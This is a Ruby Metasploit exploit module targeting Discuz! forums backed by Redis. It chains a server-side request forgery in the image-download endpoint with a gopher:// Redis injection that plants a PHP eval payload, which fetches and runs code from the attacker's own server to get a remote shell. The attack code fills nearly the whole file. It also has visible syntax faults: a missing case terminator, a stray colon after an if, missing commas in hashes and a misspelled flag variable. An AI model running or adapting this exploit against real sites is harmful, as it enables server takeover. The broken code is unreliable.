##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Discuz Redis SSRF Getshell",
      'Description'    => %q{
        The module is used to getshell via ssrf of discuz which uses redis.
      },
      'License'        => MSF_LICENSE,
      'Author'         => 
        [ 
          'superfish <sfish9hello[at]gmail.com>' # Metasploit Module
        ],
      'References'     =>
        [
          [ 'URL', 'https://www.seebug.org/vuldb/ssvid-91879' ]
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          [ 'Discuz!', { } ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "",
      'DefaultTarget'  => 0))
    
    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(80),
        OptString.new('TARGETURI', [ true, "Discuz! path", '/']),
        OptString.new('REDISIP', [ true, "IP of target redis", '127.0.0.1']),
        OptString.new('REDISPORT', [ true, "Port of target redis", '6379']),
        OptInt.new('HTTPDELAY', [ false, "Number of seconds the web server will wait before termination", 20]),
        OptInt.new('PAYLOAD_REQUEST_DELAY', [ true, "Time to wait for the payload request", 5]),
        OptString.new('UA', [ true, "User-Agent", 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.108 Safari/537.36'])
      ], self.class)
  end

  def on_request_uri(cli, req)
    print_status("Client requests URI: #{req.uri}")
    case req.uri
    when /poc\.jpg$/
      @is_poc = true
    when /exp\.jpg$/
      print_status("Sending the location to the server...")
      payload_url = 'http://' + datastore['SRVHOST'] + ':' + datastore['SRVPORT'].to_s + '/payload.jpg'
      payload_php = "$r=file_get_contents(\"#{payload_url}\");eval($r);"
      location = 'gopher://' + datastore['REDISIP'] + ':' + datastore['REDISPORT'] + '/_eval "local t=redis.call(%27keys%27,%27*_setting%27);for i,v in ipairs(t) do redis.call(%27set%27,v,%27a:2:{s:6:\"output\";a:1:{s:4:\"preg\";a:2:{s:6:\"search\";a:1:{s:7:\"plugins\";s:5:\"/.*/e\";}s:7:\"replace\";a:1:{s:7:\"plugins\";s:' + payload_php.length.to_s + ':\"' + payload_php + '\";}}}s:13:\"rewritestatus\";a:1:{s:7:\"plugins\";i:1;}}%27) end;" 0 %0d%0aquit'
      send_redirect(cli, location)
      @is_exp = true
      print_good("Send location completed")
    when /payload\.jpg$/
      print_status("Sending the payload to the server...")
      send_response(cli, payload.encode)
      print_good("Send payload completed")
  end

  def start_http_service
    # do not use SSL for this part
    # XXX: See https://github.com/rapid7/metasploit-framework/issues/3853
    # It must be possible to do this without directly editing the
    # datastore.
    if datastore['SSL']
      ssl_restore = true
      datastore['SSL'] = false
    end

    if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
      srv_host = Rex::Socket.source_address(rhost)
    else
      srv_host = datastore['SRVHOST']
    end

    service_url = srv_host + ':' + datastore['SRVPORT'].to_s
    print_status("#{rhost}:#{rport} - Starting up our web service on #{service_url} ...")
    start_service({
      'Uri' => {
        'Proc' => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
        'Path' => '/'
      }
    })

    # Restore SSL preference
    # XXX: See https://github.com/rapid7/metasploit-framework/issues/3853
    # It must be possible to do this without directly editing the
    # datastore.
    datastore['SSL'] = true if ssl_restore

    return service_url
  end

  def check
    @is_check = false
    @is_poc = false
    @service_url = start_http_service
    @uri = normalize_uri(target_uri.path, 'forum.php')
    begin
      res = send_request_cgi({
          'method'  => 'GET',
          'uri'     => uri,
          'headers' => 
            {
              "user-agent" => "#{datastore['UA']}"
            }
        })
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      print_error("HTTP Connection Failed")
      return Exploit::CheckCode::Safe
    end
    if res.code.to_s == '200':
      @formhash = /formhash" value="(.*?)"/.match(res.body)[1]
      res = send_request_cgi({
          'method'   => 'GET',
          'uri'      => uri,
          'vars_get' => 
            {
              "mod"      => "ajax",
              "action"   => "downremoteimg",
              "message"  => "<img src=http://#{@service_url}/poc.jpg />"
              "formhash" => "#{@formhash}"
            }
          'headers'  =>
            {
              "user-agent" => "#{datastore['UA']}"
            }
        })
      sleep 3
      if @is_poc
        print_good("Target has ssrf")
        @is_ckeck = true
        return Exploit::CheckCode::Vulnerable
      else
        print_error("Target may have no ssrf")
        return Exploit::CheckCode::Safe
      end
    end
  end

  def exploit
    @is_exp = false
    check
    if @is_ckeck
      res = send_request_cgi({
        'method'   => 'GET',
        'uri'      => uri,
        'vars_get' => 
          {
            "mod"      => "ajax",
            "action"   => "downremoteimg",
            "message"  => "<img src=http://#{@service_url}/exp.jpg />"
            "formhash" => "#{@formhash}"
          }
        'headers'  =>
          {
            "user-agent" => "#{datastore['UA']}"
          }
      })
      sleep 3
      if @is_exp
        res = send_request_cgi({
          'method'   => 'GET',
          'uri'      => uri,
          'vars_get' => 
            {
              "mod"    => "ajax",
              "action" => "getthreadtypes",
              "inajax" => "yes"
            }
          'headers'  =>
            {
              "user-agent" => "#{datastore['UA']}"
            }
        })
    end
  end
end
